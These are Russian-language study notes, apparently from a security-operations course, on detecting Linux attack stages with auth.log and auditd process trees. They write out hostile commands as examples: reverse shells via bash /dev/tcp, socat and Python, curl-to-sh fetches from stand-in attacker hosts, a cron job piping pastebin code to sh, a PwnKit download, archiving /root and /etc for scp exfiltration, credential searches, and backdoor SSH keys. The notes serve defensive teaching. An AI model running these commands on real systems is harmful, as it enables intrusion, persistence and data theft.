# Initial Access через SSH
Самый популярный способ Initial Access в Linux это незащищенный SSH. Каждая  выставленная в интернет машина имеет включенный SSH.
Как и RDP на windows, SSH так же мощен и плохо  защищен. Как факт протоколы отслеживаются как [External Remote Services](https://attack.mitre.org/techniques/T1133/) по MITRE. 
Доступ к SSH зачастую осуществляется двумя базовыми путями такими как украденный ключи или взломанный пароль. 

1. Основные риски использования аутентификации по ключу
	- Злоумышленники получают доступ к сервису или исходному коде где хранятся приватные ключи SSH
	- Злоумышленники крадут SSH ключи от сервера через инфицирование админского ноутбука с помощью стилера
2. Дополнительные риски при использовании пароля:
	- Админ поставил слабый SSH пароль для теста и забыл поменять его
	- IT специалист включает SSH для подрядчика который установил пароль 12345678
	- Сетевой инженер выставляет в открытый доступ старый и незащищенный SSH сервер

## Пример Взлома SSH
![[Pasted image 20260610213520.png]]
### Обнаружение SSH атаки
На Linux вам не нужно учить множество полей logon, можно проанализировать несколько полей логина. 

```shell
ubuntu@thm-vm:~$ cat /var/log/auth.log | grep -E 'Accepted' 
2025-08-19T14:00:02 thm-vm sshd[1013]: Accepted publickey for ansible from 
10.14.105.255 port 18442 ssh2: [...] 
2025-08-20T12:56:49 thm-vm sshd[2830]: Accepted password for jsmith from 54.155.224.201 port 51058 ssh2 
2025-08-22T03:14:06 thm-vm sshd[2830]: Accepted password for jsmith from 196.251.118.184 port 51058 ssh2
```

первый вход выглядит легитимно так как используется внутренний IP и public key. Кроме того вход ровно в 14:00 соответствует поведению периодической задачи. Тем не менее для уверенности необходимо убедиться что `10.10.105.255` действительно является Ansible сервером и проверить последующую активность данного пользователя на признаки взлома

Следующие два входа выглядит более интересно и имеет три красных флага: Парольная аутентификация, входы с внешнего IP и время между логинами(один из входов был ночью) Тем не менее для вынесения окончательного решения необходимо изучить дополнительные детали:

- Имя пользователя: Кто владелец учетки? Ожидается ли что он войдет в систему в это время и с этого IP адреса
- IP адрес источника, что говорят об этом IP инструменты TI и поиск по активам? является ли он доверенным или вредоносным
- История входов: предшествовал ли входу брутфорс или другие подозрительные системные события
- Является ли вход подозрительным? следует ли анализировать действия пользователя после входа

# Initial Access через Сервисы
Линукс хосты часто являются частью важной инфраструктуры которая выставлена наружу поэтому при ее взломе мы можем получить дальнейший взлом
![[Pasted image 20260610215458.png]]
## Использование логов приложений
Если вы хотите узнать был ли взломан ваш почтовый сервер, вы естественно обращаетесь к логам email. С другой стороны можно ли ожидать что приложение зарегистрирует что его взломали, конечно нет, Такова природа логов приложений, они редко могут показать полную историю, но могут предоставить уникальные данные для анализа, например: 

- Использовать логи веб сервера для определения атаки
- Использовать логи бд для определения странных sql запросов
- Использовать логи VPN для ненормальных входов 
- И другие логи для специфических событий, таких как банковские транзакции

## Web Initial Access
Представим что написали приложение которое уязвимо в command Injection в логах мы увидим:

```shell
ubuntu@thm-vm:~$ cat /var/log/nginx/access.log 
10.2.33.10 - - [19/Aug/2025:12:26:07] "GET /ping?host=3.109.33.76 HTTP/1.1" 200 [...] 10.12.88.67 - - [23/Aug/2025:09:32:22] "GET /ping?host=54.36.19.83 HTTP/1.1" 200 [...] 10.14.105.255 - - [26/Aug/2025:20:09:43] "GET /ping?host=hello HTTP/1.1" 500 [...] 10.14.105.255 - - [26/Aug/2025:20:09:46] "GET /ping?host=whoami HTTP/1.1" 500 [...] 10.14.105.255 - - [26/Aug/2025:20:09:49] "GET /ping?host=;whoami HTTP/1.1" 200 [...] 10.14.105.255 - - [26/Aug/2025:20:10:41] "GET /ping?host=;ls HTTP/1.1" 200 [...]
```

# Detecting Service breach
Один из способов обнаружения взлома это использование журналов приложений, но журналы приложений не всегда доступны и полезны
Вместо них большинство команд SOC полагаются на анализ дерева процессов - универсальный подход к раскрытию первоначального доступа

Например вы получили alert о том что была выполнена whoami, чтобы разобраться детальнее необходимо построить дерево процессов и отследить команду до родительского процесса: ![[Pasted image 20260610220700.png]]
# Аудит и дерево процессов
Продолжая пример вы начинаете с поиска подозрительной команды в логах с помощью команды `ausearch -i -x whoami`. Затем вы перемещаетесь вверх по дереву процессов используя опцию `--pid`, пока не дойдете до PID 1, процесса операционной системы в итоге дерево показывает, что команда `whoami` была запущена веб приложением на Python `/opt/mywebapp/app.py`. Что сразу же вызывает вопрос было ли приложение взломано или использовано в качестве точки входа

```shell
ubuntu@thm-vm:~$ ausearch -i -x whoami # -x filters the results by the command name 

type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : syscall=execve success=yes exit=0 items=2 ppid=3905 pid=3907 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/whoami key=exec 



ubuntu@thm-vm:~$ ausearch -i --pid 3905 # 3905 is a parent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami type=SYSCALL msg=audit(08/25/25 16:28:17.101:983) : syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3905 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/dash key=exec 


ubuntu@thm-vm:~$ ausearch -i --pid 3898 # 3898 is a grandparent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/python3 /opt/mywebapp/app.py type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : syscall=execve success=yes exit=0 items=2 ppid=1 pid=3898 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/python3.12 key=exec
```

далее вы можете задаться вопросом, является ли команда whoami частью нормального поведения приложения. Возможно это так но для ответа на этот вопрос потребуется анализ веблогов, внешнее исследование или общение с разработчиками. Вместо этого вы можете использовать дерево процессов, чтобы найти другие, более опасные команды, запущенные приложением. Перечислив все дочерние процессы файла `/opt/mywebapp/app.py` вы можете найти более явные доказательства взлома приложения например вредоносную curl
```shell
ubuntu@thm-vm:~$ ausearch -i --ppid 3898 | grep 'proctitle' # Use grep for a simpler
output type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami type=PROCTITLE msg=audit(08/25/25 16:28:18.230:985) : proctitle=/bin/sh -c ls -la type=PROCTITLE msg=audit(08/25/25 16:28:19.765:987) : proctitle=/bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh  
[...]
```

# Advanced Initial Access
Теперь рассмотрим случаи когда злоумышленники получали доступ с помощью людей 

| Сценарий | Последствия |
|---|---|
| IT-специалист ищет решение проблемы с сервером и в отчаянии выполняет скрипт с форума: `curl https://shadyforum.thm/fix.sh \| bash` | Специалист не проверил содержимое скрипта — им оказалась малварь, незаметно заразившая сервер |
| Разработчик хочет установить пакет `fastapi`, но допускает опечатку: `pip3 install fastpi` | Пакет с опечаткой оказался вредоносным — намеренно подготовлен и опубликован злоумышленниками (typosquatting) |
## Атака на цепочку поставок
Эти атаки сначала взламывают ПО а потом заражают всех его пользователей. Поскольку типичный линкус сервер использует сотни рабочих зависимостей, поддерживаемых разными разработчиками атака может происходить откуда угодно.

Все методы Initial Access могут быть обнаружены через анализ дерева процессов

![[Pasted image 20260610222200.png]]

# Discovery
Обычно Ботнет сначала дает доступ к линукс машине а уже потом подключается злоумышленник.
![[Pasted image 20260611120537.png]]

## First Actions
Обычно первые команды которые запускают атакующие очень похожи

| Цель разведки                   | Типичные команды                                                       |
| ------------------------------- | ---------------------------------------------------------------------- |
| OS и File System разведка       | `pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a`, `hostname`         |
| Разведка пользователей и групп  | `id`, `whoami`, `w`, `last`, `cat /etc/sudoers`, `cat /etc/passwd`     |
| Процессы и сеть                 | `ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp` |
| Разведка в песочнице и в облаке | `systemd-detect-virt`, `lsmod`, `uptime`, `pgrep "<edr-or-sandbox>"`   |
## Обнаружение разведки
### Специальная разведка
После первичной разведки злоумышленники фокусируются на командах для достижения их целей: Стиллеры ищут пароли и секреты, криптомайнеры используют CPU и GPU информацию для обеспечения майнинга и ботнет скрипты сканируют сеть на наличие новых жертв. 

| Цели Атаки                                                          | Типичные команды                                                       |
| ------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| Найти и украсть учетные данные или другую чувствительную информацию | `history \| grep pass`, `find / -name .env`, `find /home -name id_rsa` |
| Понять на сколько система подходит для криптомайнинга               | `cat /proc/cpuinfo`, `lscpu \| grep Model`, `free -m`, `top`, `htop`   |
| Сканирование внутренней сети для других уязвимых                    | `ping <ip>`, `for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done`    |
### Обнаружение разведки
Обнаружить команды для разведки легко с помощью. auditd или других инструментов мониторинга во время выполнения. Первое это настройка auditd для логирования правильных команд. ![[Pasted image 20260611121950.png]]

Очень важно так же понимать контекст для команд разведки. Например очень странно если веб сервер неожиданно начал выполнять `whoami` или один из IT коллег начал искать секреты с помощью find или grep. Но с другой стороны от инструмента мониторинга сети ожидается переодический PING для проверки локальной сети. Вы можете получить больше контекста построив дерево процессов
```shell
ubuntu@thm-vm:~$ ausearch -i -x whoami # Look for a Discovery command like whoami
type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3907 auid=ubuntu uid=ubuntu exe=/usr/bin/whoami 

ubuntu@thm-vm:~$ ausearch -i --pid 3898 # Identify its parent process, a lp.sh script 
type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/bash /tmp/lp.sh 
type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3840 pid=3898 auid=ubuntu uid=ubuntu exe=/usr/bin/bash 

ubuntu@thm-vm:~$ ausearch -i --ppid 3898 # Look for other processes created by the lp.sh [Five more commands like "find /home -name *secret*" confirming the script is malicious ]
```
# Ingress tool transfer 
Наиболее распространенные методы скачать дополнительные тулзы на машину жертвы: 

| Команда                                 | Пример использования                                            |
| --------------------------------------- | --------------------------------------------------------------- |
| Wget - скачать файл с сайта             | wget https://github/[...]/something.tar.gz -O /tmp/miner.tar.gz |
| Curl - сделать запрос к сайту           | curl --output /var/www/html/backdoor.php "https://backdor"      |
| SSH -  передать файл через SCP или SFTP | scp kali@c2server:/home/kali/cve.sh /tmp/cve/cve.sh             |
Как и другие creation events команды также могут сохраняться в auditd и иногда в Bash_history. однако существует случай когда логи бесполезны. Если жертва доступна по SSH, злоумышленник может запустить scp или sfrp со своей системы. В этом случае вы не увидите команду в журналах auditd но увидите новый вход ssh, тот же принцип применим и к другим службам передачи файлов, таких как FTP или SMB.

Атакующий подключается к жертве:

```shell
attacker@attack-vm:~$ scp ./malware.sh ubuntu@thm-vm:/tmp  
[OK] Connecting to thm-vm machine via SSH...  
[OK] Logged in on thm-vm via SSH as "ubuntu" [OK] File transferred from attack-vm to thm-vm  
[OK] Job is done, logging out from thm-vm  
  
# To detect on victim, look for SSH logins in /var/log/auth.log
```

Жертва подключается к атакующему:

```shell
ubuntu@thm-vm:~$ scp attacker@attack-vm:./malware.sh /tmp 
[OK] Connecting to attack-vm machine via SSH...  
[OK] Logged in on attack-vm via SSH as "attacker" [OK] File transferred from attack-vm to thm-vm  
[OK] Job is done, logging out from attack-vm  
  
# To detect on victim, look for "scp" command in Auditd logs
```

## Дополнительные правила обнаружения
### Network Traffic
- Скачивание с IP который был замечен в кибер атаках
- Скачивание с подозрительных или известных опасных доменов
- Скачивание с публичного сервиса известных инструментов для атаки
### File Events
- Недавно созданный файл во временных хранилищах, таких как `/tmp` или `/vat/tmp`
- Недавно созданный файл названный: `exploit`, `shell.php` или `ghdfkjgs`
### Предупреждения от антивируса
- EDR или антивирус создает предупреждение о новом подозрительном процессе или файле

# Более сложные и глубокие атаки и их обнаружение
## Reverse Shells
Злоумышленники которые проникают через ssh получают удобный терминал с цветовой индикацией, автозавершением и поддержкой ctrl+c. Однако не каждое нарушение безопасности обеспечивает полнофункциональный терминал. При первоначальном доступе через эксплоит или веб уязвимость злоумышленники могут столкнуться с ограничениями: некорректный вывод команд, задержки выполнения и таймауты, ограничение скорости, сетевые ограничения и многое другое. ![[Pasted image 20260611162940.png]]
Чтобы обойти ограничения злоумышленники создают Reverse Shell, то есть сеанс от жертвы к злоумышленнику.

| Команда на машине жертвы                                               | Пояснение                                                                               |
| ---------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1`                            | Жертва принудительно подключается к 10.10.10.10:1337 и запускает `bash` для атакующего. |
| `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` | Альтернатива через socat. Атакующий слушает на 10.20.20.20:2525.                        |
| `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'`   | Альтернатива через Python. Атакующий слушает на 10.30.30.30:80.                         |
## Обнаружение Revers shells
пример логов для обнаружения 

```shell
root@thm-vm:~$ ausearch -i -x socat # Look for suspicious commands like socat
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...] 
type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec
 
root@thm-vm:~$ ausearch -i --pid 27806 # Find its parent process and build a process tree 
type=PROCTITLE msg=audit(09/19/25 17:42:07.825:404) : proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:10.20.20.20:2525 EXEC:'bash',[...] 
type=SYSCALL msg=audit(09/19/25 17:42:07.825:404) : ppid=27796 pid=27806 auid=unset uid=serviceuser key=exec
 
root@thm-vm:~$ ausearch -i --pid 27796 # Move up the process tree to confirm its origin - TryPingMe 
type=PROCTITLE msg=audit(09/19/25 17:41:57.252:403) : proctitle=/usr/bin/python3 /opt/trypingme/main.py 
type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid=1 pid=27796 auid=unset uid=serviceuser key=exec
```

после того как Revers Shell поставлен, обычно следует фаза разведки. При этом мы можем перечислить все команды, исходящие из запущенного шела, построив дерево процессов

```shell
root@thm-vm:~$ ausearch -i -x socat # Start from the detected reverse shell
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...] 
type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec 

root@thm-vm:~$ ausearch -i --ppid 27808 | grep proctitle # List all its child processes 
type=PROCTITLE msg=audit(09/19/25 17:42:12.825:408) : proctitle=id type=PROCTITLE msg=audit(09/19/25 17:42:14.371:410) : proctitle=uname -a 
type=PROCTITLE msg=audit(09/19/25 17:42:25.432:412) : proctitle=ls -la . [...]
```

## Повышение привилегий
Еще одним препятствием для злоумышленников являются недостаточные привилегии, первоначальный доступ не всегда означает полную компрометацию, веб атаки и эксплоиты часто начинают с www-data либо пользователями с еще более ограниченными правами. В этом случае злоумышленникам требуется повышение привилегий, которых можно достигнуть разными способами. 

Например чтобы получить доступ к root злоумышленники могут:

| Предшествующее обнаружение (ЕСЛИ)                              | Повышение привилегий (ТОГДА)                                                            |
| -------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| `uname -a` показывает старую непропатченную Ubuntu 16.04       | Запустить эксплойт PwnKit: `wget http://bad.thm/pwnkit.sh \| bash`                      |
| `find /bin -perm 4000` обнаруживает бинарь `env` с флагом SUID | Использовать SUID-уязвимость для получения root: `/bin/env /bin/bash -p`                |
| `ls /etc/ssh` раскрывает незащищённый файл `ssh-backup-key`    | Попытаться использовать файл для получения root: `ssh root@127.0.0.1 -i ssh-backup-key` |
## Обнаружение повышения привилегий 
Обнаружить повышение привилегий достаточно тяжело потому что их много и они разные это могут быть: Десятки SUID misconfig и тысячи уязвимостей ПО, которые могут быть эксплуатированы уникальным образом. Таким образом более универсальный подход это обнаружение окружающих событий. Например рассмотрим атаку, которая состоит из 3 этапов
- Развдека
- Повышение привилегий
- И эксфильтрация после получения доступа

```bash
# Detection 1: A Spike of Discovery Commands
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel

# Detection 2: A Download to Temp Directory
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit

# Detection 3: Data Exfiltration With SCP
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
```

Даже если вы не знаете точных механик работы эксплоита вы можете обнаружить аномалии, используя более распространенные индикаторы атак. После обнаружения подозрительной активности вы можете подтвердить, удалось ли повысить привилегии, сравнив фактических пользователей до и после эксплоита. Если пользователи различаются значит злоумышленник получил повышенные привилегии

Пример такой эксплуатации:
```shell
root@thm-vm:~$ ausearch -i -x pwnkit # The PwnKit was launched by serviceuser (Look at the UID field) 
type=PROCTITLE msg=audit(09/19/25 17:56:12.154:416) : proctitle=/tmp/pwnkit 
type=SYSCALL msg=audit(09/19/25 17:56:12.154:416) : ppid=24302 pid=24304 auid=unset uid=serviceuser key=exec 

root@thm-vm:~$ ausearch -i --ppid 24304 # The PwnKit spawned a root shell (Look at the UID field) 
type=PROCTITLE msg=audit(09/19/25 17:56:12.807:418) : proctitle=bash 
type=SYSCALL msg=audit(09/19/25 17:56:12.807:418) : ppid=24304 pid=24310 auid=unset uid=root key=exec 

root@thm-vm:~$ ausearch -i --ppid 24310 # The threat actor continues the attack as root user 
type=PROCTITLE msg=audit(09/19/25 17:56:15.225:424) : proctitle=whoami 
type=SYSCALL msg=audit(09/19/25 17:56:15.225:424) : ppid=24310 pid=24312 auid=unset uid=root key=exec
```

## Persistence in Linux

### Cron Persistence
Cron Jobs похожи на запланированный задачи в Windows они легко запускают процесс по расписанию и это один из самых популярных методов.
Пример:

```bash
# A line added by APT29 to /var/spool/cron/<user> to run malware on boot
@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
```

```bash
# A simplified command that adds the cron job to /etc/cron.d/root
echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
```

### Systemd Persistence
Сервис Systemd самый критичный компонент системы. В наши дни DNS и SSH и практически все веб серверы организованы как отдельные системы. .service файлы находятся в `/lib/systemd/system` или `/etc/systemd/system` папках. Вместе с рут привилегиями вы можете создать свой собственный сервис, так же как и злоумышленники. Например:

```bash
# A simplified content of /lib/systemd/system/cloud-online.service file
[Unit]
Description=Initial cloud-online job    # Fake description to mimic a trusted service
[Service]
ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguisted as a trusted file
```

### Обнаружение persistence 
Задания крон и службы systemd устанавливаются как простые текстовые файлы, что означает что вы можете отслеживать их изменения с помощью auditd. Кроме того, закрепление можно обнаружить отслеживая задания связанных процессов в частности, crontab для управления заданиями cron и systemctl для управления службами

| Действие | Объекты мониторинга |
|---|---|
| Отслеживать изменения в файлах cron-заданий | `/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/*`, `/var/spool/crontab/*` |
| Отслеживать изменения в папках systemd | `/lib/systemd/system/*`, `/etc/systemd/system/*` и менее распространённые расположения |
| Отслеживать связанные процессы | `nano /etc/crontab`, `crontab -e`, `systemctl start\|enable <service>` |
```shell
root@thm-vm:~$ ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd 
type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=vi /etc/systemd/system/malicious.service 
type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/etc/systemd/system/malicious.service 
type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/ 

type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd 

root@thm-vm:~$ ausearch -i -x crontab # Look for execution of crontab command 
type=PROCTITLE msg=audit(09/22/25 17:25:14.933:807) : proctitle=crontab -e 
type=SYSCALL msg=audit(09/22/25 17:25:14.933:807) : syscall=execve [...] ppid=1265 pid=1316 uid=root key=exec
``` 
## Account Persistence  
### New User Account
Если ssh доступ закрыт, злоумышленники могут создать новую учетную запись пользователя, добавить ее в привилегированную группу, а затем использовать для дальнейших подключений по SSH. Обнаружить так же не особо сложно, поскольку можно отслеживать события создания пользователя в журналах аутентификации, а затем восстановить полное дерево процессов с помощью auditd

Пример:

```shell
root@thm-vm:~$ cat /var/log/auth.log | grep -E 'useradd|usermod' 

2025-09-18T15:46:30 thm-vm useradd[27254]: new group: name=support, GID=1001 
2025-09-18T15:46:30 thm-vm useradd[27254]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash 
2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to group 'sudo' 
2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to shadow group 'sudo'
```

### Backdoored SSH Keys
Еще один метод сохранения учетной записи - это создание бекдора для SSH ключей одного из пользователей и использование из для будущих входов в систему вместо пароля. 
Этот метод сложно обнаружить IT специалистам потому что опасные ключи могут сливаться с легитимными

```shell
# Adding SSH backdoor to the authorized_keys 
root@thm-vm:~$ echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys 

# It's hard to guess which key is a backdoor! 
root@thm-vm:~$ cat ~/.ssh/authorized_keys ssh-ed25519 AAAAC3Nza...oh5fpNy1Gi # Legitimate key 
ssh-ed25519 AAAAC3Nza...N9a2UYsFpQ # Legitimate key 
ssh-ed25519 AAAAC3Nza...IkiINvQt/R # Backdoor key
```

По умолчанию авторизированные открытые ключи SSH хранятся в файле `~/.ssh/authorized_keys` каждого пользователя, поэтому лучший способ отслеживать их с помощью auditd. Обратите внимание, что полагаться на события создания процессов неэффективно, поскольку существует множество способ изменения ключей SSH, некоторые корректно отслеживаются например auditd. Например `echo [ket]>> ~/.ssh/authorized_keys` не будет записана в лог, потому что `echo` это встроенная команда оболочки

```shell
# Traces of a backdoor created with "echo [key] >> ~/.ssh/authorized_keys"  
# Note how the malicious "echo" command is logged simply as "bash" 
root@thm-vm:~$ ausearch -i -f /.ssh/authorized_keys 
type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=bash 
type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/home/user/.ssh/authorized_keys 
type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/ 
type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd
```

### Application Persistence
представьте себе веб-сайт WordPress где учетная запись администратора взломана. Обладая правами администратора, злоумышленники могут добавить бэкдор на веб сайт и выполнять команды через него - без заданий cron или SSH-ключей. Более того, поскольку сохранение активности происходит на уровне приложения auditd и системные журналы часто его не видят
![[Pasted image 20260611180934.png]]